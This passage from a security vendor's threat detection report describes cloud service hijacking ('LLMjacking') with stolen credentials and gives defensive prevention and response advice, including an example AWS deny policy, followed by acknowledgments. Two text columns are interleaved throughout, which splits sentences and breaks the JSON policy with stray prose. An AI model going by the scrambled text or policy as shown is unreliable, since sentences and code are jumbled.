avoid service interruptions if one has its access
disabled. Overall, this technique allows adversaries
to sell access and pass all LLM usage costs to
the victim.
How do adversaries
hijack cloud services?
Typically, adversaries gain access to these
cloud services through compromised valid
cloud accounts. Initial access vectors vary, but
typically take the form of harvested credentials
that are sold from initial access brokers.
Once adversaries obtain credentials for a cloud
environment, they can begin reconnaissance
activities. For example, for LLMjacking, they may

2025 THREAT DETECTION REPORT 65
Take action
Visit the Cloud Service Hijacking technique Response
page to explore:
Response boils down to removing the access
• relevant MITRE ATT&CK data sources to the service that the adversary has gained.
• log sources to expand your collection The simplest scenario is removing the tokens
• detection opportunities you can tune to or credentials for the compromised user. If they
your environment are leveraging static, long-term keys, then this
• atomic tests to validate your coverage is as simple as deactivating them to prevent
the access. This is only a short-term solution as
Defenders can take several actions to secure their adversaries typically gain methods to continue
environments and to quickly respond to affected their persistence in the environment to frustrate
cloud accounts that may have been compromised response methods.
to perform service hijacking. Fortunately, the
activities for hijacking are limited to specific As with prevention, being able to conditionally
services, which allows defenders to craft explicit deny certain users from access will allow you
Service Control Policies (SCP) that can eliminate to prevent the adversary from continuing their
the risk of abuse, barring total account takeover. activity while also limiting the business impacts if
your company relies on a certain service such as
Bedrock or Azure OpenAI.
Prevention
For example, in AWS, if you have a role for
Understanding the services being used in your
Bedrock access and you have comprehensive user
environment is key to effective prevention. If
tracking with fields such as SourceIdentity, you
you are not currently using a service in your
can conditionally deny access to the role by the
business, it is wise to have an explicit deny policy
SourceIdentity field, which will limit the access
in place to prevent any abuse. It is important that
only for that one account. An example SCP for
explicit deny policies are in place at the highest
this type of response is provided below.
organization level possible in the environment,
as any explicit deny policy will overrule an
allow policy that is applied at a lower level in
the environment. This will prevent adversaries {
from abusing these services even if they fully “Version”: “2012-10-17”,
compromise an account in your organization. “Statement”: [
{
“Effect”: “Deny”,
A full blanket deny policy may not be feasible for
“Action”: “*”,
your environment due to many factors. In this case,
“Resource”: “*”,
relying on limiting access to only those necessary
“Condition”: {
(i.e., the principle of least privilege) is key. Role-
“StringLike”: {
based access control (RBAC) limits the vectors
“aws:SourceIdentity”: [
by which adversaries can access resources and “suspicious_user@
allows for simplified logging, as you only have to example.com”
monitor certain roles and services rather than ]
numerous users. Setting conditional policies that }
explicitly deny except for certain roles will have }
similar effects as blanket deny policies. }
]
}

2025 THREAT DETECTION REPORT 66
Acknowledgments
Thanks to the dozens of security experts, A special thanks to the following Canaries who
writers, editors, designers, developers, and contributed to this year’s report:
project managers who invested countless hours
to produce this report. And a huge thanks to the
MITRE ATT&CK® team, whose framework has Jimmy Astle
helped the community take a giant leap forward in
Laura Brosnan
understanding and tracking adversary behaviors.
Also a huge thanks to all the Canaries—past
Alex Berninger
and present—who have worked on past Threat
Detection Reports over the last six years. The Dave Bogle
Threat Detection Report is iterative, and parts of
the 2025 report are derived from previous years. Rafael Del Ray
This report wouldn’t be possible without all of you!
Mike Devens
Brian Donohue
Jeff Felling
Margaret Garcia
Tyler Gerard
Matt Graeber
Jesse Griggs
Dominic Heidt
Christina Johns
Tony Lambert
Susannah Clark Matt
Keith McCammon
Shelley Moore
Katie Nickels
Kyle Rainey
Stef Rand
Dalton Vanhooser
Chris Velez